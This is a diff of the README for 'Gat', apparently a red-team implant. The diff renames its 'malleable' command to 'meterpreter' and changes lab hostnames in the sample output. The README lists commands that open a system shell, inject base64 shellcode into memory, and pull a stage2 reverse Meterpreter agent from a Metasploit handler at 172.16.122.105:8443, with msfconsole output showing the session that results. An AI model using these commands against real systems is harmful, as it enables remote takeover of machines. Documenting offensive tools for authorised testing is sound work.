@@ -61,7 +61,7 @@ The following special commands are supported:
 
 * ``run_shell`` : drops you an system shell (allowing you, for example, to change directories)
 * ``inject <base64 shellcode>`` : injects a shellcode (base64 encoded) in the same process memory, and executes it
-* ``malleable [tcp|http|https] IP:PORT`` : connects to a multi/handler to get a stage2 reverse tcp, http or https malleable agent from metasploit, and execute the shellcode in memory (Windows only at the moment)
+* ``meterpreter [tcp|http|https] IP:PORT`` : connects to a multi/handler to get a stage2 reverse tcp, http or https malleable agent from metasploit, and execute the shellcode in memory (Windows only at the moment)
 * ``exit`` : exit gracefully
 
 ## Usage
@@ -166,10 +166,10 @@ HandlerSSLCert => ./server.pem
 [14:13:29][172.16.122.105][Sessions: 0][Jobs: 1] exploit(multi/handler) >
 ```
 
-Then, in `Gat`, use the `malleable` command:
+Then, in `Gat`, use the `meterpreter` command:
 
 ```bash
-[Gat]> malleable https 172.16.122.105:8443
+[Gat]> meterpreter https 172.16.122.105:8443
 ```
 
 A new meterpreter session should pop in `msfconsole`:
@@ -186,13 +186,13 @@ Active sessions
 
   Id  Name  Type                     Information                            Connection
   --  ----  ----                     -----------                            ----------
-  1         meterpreter x64/windows  DESKTOP-3PVV31A\lab @ DESKTOP-3PVV31A  172.16.122.105:8443 -> 172.16.122.105:44804 (10.0.2.15)
+  1         meterpreter x64/windows  LWS01\sconner @ LWS01  172.16.122.105:8443 -> 172.16.122.105:44804 (10.0.2.15)
 
 [14:16:48][172.16.122.105][Sessions: 1][Jobs: 1] exploit(multi/handler) > sessions -i 1
 [*] Starting interaction with 1...
 
 malleable > getuid
-Server username: DESKTOP-3PVV31A\lab
+Server username: LWS01\sconner
 ```
 
 ### malleable staging
